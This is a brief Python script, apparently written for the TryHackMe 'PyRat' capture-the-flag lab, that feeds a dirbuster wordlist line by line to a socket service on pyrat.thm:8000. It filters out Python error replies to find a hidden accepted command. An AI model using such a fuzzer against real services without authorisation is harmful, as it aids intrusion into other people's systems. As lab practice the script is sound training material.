import socket

# Remote host details
host = 'pyrat.thm'
port = 8000

# Wordlist to use
wordlist = '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'

def fuzz():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            # Connecting to the remote host
            s.connect((host, port))
            
            # Opening the wordlist
            with open(wordlist, 'r') as file:
                for line in file:
                    # Removing any whitespaces from the payload of wordlist
                    command = line.strip()
                    
                    # Sending the lines 
                    s.sendall(command.encode() + b'\n')
                    
                    # Capturing the response
                    response = s.recv(1024).decode().strip()
                    
                    # Logic for capturing the valid response:
                    if response != "" and "is not defined" not in response and "leading zeros" not in response and "invalid syntax" not in response:
                        # print(f'[Found] Valid keyword is: {response}')
                        print(f'Command: {command}')
                        break                        
        except ConnectionError:
            print(f'[Error] Unable to connect to remote {host}:{port}')
        except KeyError as e:
            print(f'Error {e} occured')
            
            
fuzz()
